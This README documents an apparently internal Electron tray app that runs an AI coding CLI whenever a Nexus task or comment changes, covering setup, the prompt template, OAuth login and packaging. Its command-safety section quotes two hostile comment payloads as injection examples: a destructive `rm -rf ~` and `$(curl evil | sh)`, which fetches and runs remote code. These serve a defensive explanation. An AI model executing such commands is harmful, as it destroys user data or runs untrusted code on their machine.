# Nexus Agent (desktop app)

Runs a local AI CLI (Claude Code by default, or whatever you configure)
the moment a task you're on changes in Nexus — no polling, no manual
"let me check if it's my turn" session. Lives in the tray/menu bar; install
once, forget about it.

```
notify-server --WebSocket--> Nexus Agent (this app) --spawns--> your AI CLI, in your project repo
```

## Install (end users — no Node.js/npm knowledge needed)

1. Download the installer for your OS (`.dmg` for Mac, `.exe` for Windows) from wherever your team distributes it.
2. Open it, drag/run as normal for your OS.
3. First launch opens **Settings** automatically since nothing's configured yet:
   - **บัญชี Nexus**: click **เข้าสู่ระบบ** — opens your browser to log into Nexus (same PKCE flow as `nexus-mcp-login`, but its own separate session — logging into one doesn't log you into the other, and you do need to do this once even if you're already logged into `nexus-mcp-login`). Once done, the app authenticates its connection with that login instead of a shared secret — see "Auth" below for why.
   - **Server**: defaults to the team's `notify-server` address, only change if told to
   - **AI ที่จะใช้**: pick a preset (Claude Code / Codex / Gemini CLI) or "Custom" to write your own command
   - **โฟลเดอร์โปรเจกต์**: add one row per repo you work in — matched against the task's repo name in Nexus, so events for a repo you haven't mapped are safely skipped rather than run in the wrong folder
   - **เก็บประวัติ Activity ไว้กี่วัน**: 1/3/7 days — completed jobs older than this are pruned from `history.jsonl` (in the app's userData folder) the next time the app starts or settings are saved
4. Click **Test** to confirm the command runs before saving — catches "command not found" immediately instead of only failing silently later when a real task comes in (tests against the first mapped repo's folder).
5. **Save**. The app starts at login from now on (tray icon), reconnects automatically if your laptop sleeps or the network drops.

### The `{{prompt}}` command template

The Command field (e.g. `claude -p "{{prompt}}"`) is a template, not a
literal command — `{{prompt}}` gets replaced with the actual task/comment
text before running, e.g. a `task.comment_created` event becomes:

```
[Nexus] PEA-T050 — Access Log Retention ≥90 วัน (TOR ข้อ 4.2) [demo-project-team]
New comment from Tech Lead: "ช่วยเช็ค log retention policy ให้หน่อย"
http://27.254.62.17:8090/projects/.../tasks/cmrn13n4400553gswkitgjr2o
```

so `claude -p "{{prompt}}"` runs, in effect, `claude -p "<that whole block
of text>"`. Keep `{{prompt}}` wrapped in quotes in the template — see
"Command safety" below for why the quoting matters, not just style.

### Auth

The socket connection to `notify-server` authenticates as *you*, not as
"whoever knows the shared secret" — logging in gets a real per-person
OAuth token (same kind `nexus-mcp-login` gets, via pm-system), and
`notify-server` verifies it and reads your member id out of the token
itself rather than trusting a client-supplied one. Nothing to request from
an admin anymore; if login fails, it's your Nexus account/browser, not a
missing secret.

Pause anytime from the tray menu (**Enabled** checkbox) without losing the connection — you'll still see activity queue up, just won't auto-run anything until re-enabled.

## Why a desktop app instead of routines/CI-CD

Earlier designs this session (Claude Code cloud routines, GitLab CI/CD jobs)
hit real platform walls — routines only support GitHub repos and this
team's code is on an internal GitLab instance; CI/CD was ruled out to avoid
touching each project's existing deploy pipeline. Running locally on the
actual developer's machine sidesteps both: it already has real GitLab
access and an already-authenticated `claude` (or whichever) CLI, no shared
server auth juggling needed. See `nexus-mcp/DEVLOG.md` for the full trail.

## Command safety

The configured command is **never run through a shell** — `{{prompt}}` is
substituted after tokenizing the template, then spawned directly as
`spawn(cmd, args, { shell: false })`. Task/comment content from Nexus is
attacker-adjacent (anyone with API access to a project can write it), so
this matters: a comment containing `` `rm -rf ~` `` or `$(curl evil | sh)`
lands as one inert argv string, never interpreted as shell syntax. Verified
directly — see `lib/command.js` and the test cases run during development
(not part of the shipped app, but in this session's own record).

## Development

```bash
npm install
npm start          # runs the app via the local Electron dev binary
```

**A real limitation hit while first building this**: it was developed
inside a sandboxed environment where the real Electron binary couldn't be
downloaded (network-restricted, left a ~50KB stub instead of the real
~100MB+ app), so the GUI layer couldn't be launched and visually verified
there at the time. Since then, on a normal machine, the GUI has been
exercised for real: tray → Settings/Activity windows launched with the
actual Electron binary, buttons driven via CDP (`Runtime.evaluate` +
`Page.captureScreenshot`, since there's no `playwright` dependency here)
against a real `notify-server` connection, a real Nexus task-comment event
triggering a real job end-to-end, and Cancel/Retry both exercised on a
live running job. Still worth a manual `npm start` smoke test after any
UI change, same as any GUI code — just not an unverified blind spot anymore.

## Packaging

```bash
npm run dist
```

Produces a `.dmg` (Mac) / NSIS installer (Windows) via `electron-builder`,
per the `build` config in `package.json`.

**Not done, and needed before real distribution:**

- **Code signing.** Unsigned builds trigger Gatekeeper ("unidentified
  developer") on Mac and SmartScreen warnings on Windows. Needs an Apple
  Developer account (for `mac.identity`) and a Windows code-signing cert
  (for `win.certificateFile`) — neither configured here. Without them,
  each teammate has to manually approve the app the first time
  (System Settings → Privacy & Security → "Open Anyway" on Mac).
- **Update feed hosting.** `package.json`'s `build.publish` points at
  `http://27.254.62.17:8090/agent-app-releases/` as a placeholder — that
  path doesn't serve anything yet. `electron-builder`'s `generic` provider
  just needs `latest.yml`/`latest-mac.yml` plus the built artifacts
  reachable over plain HTTP at that URL; point it at wherever your team
  actually hosts static files (could be a simple folder served by nginx
  on the same box as pm-system/notify-server, doesn't need to be
  internet-facing any more than those are). Once that's live,
  `electron-updater`'s `checkForUpdatesAndNotify()` (already wired in
  `main.js`) picks up new versions automatically on every launch.
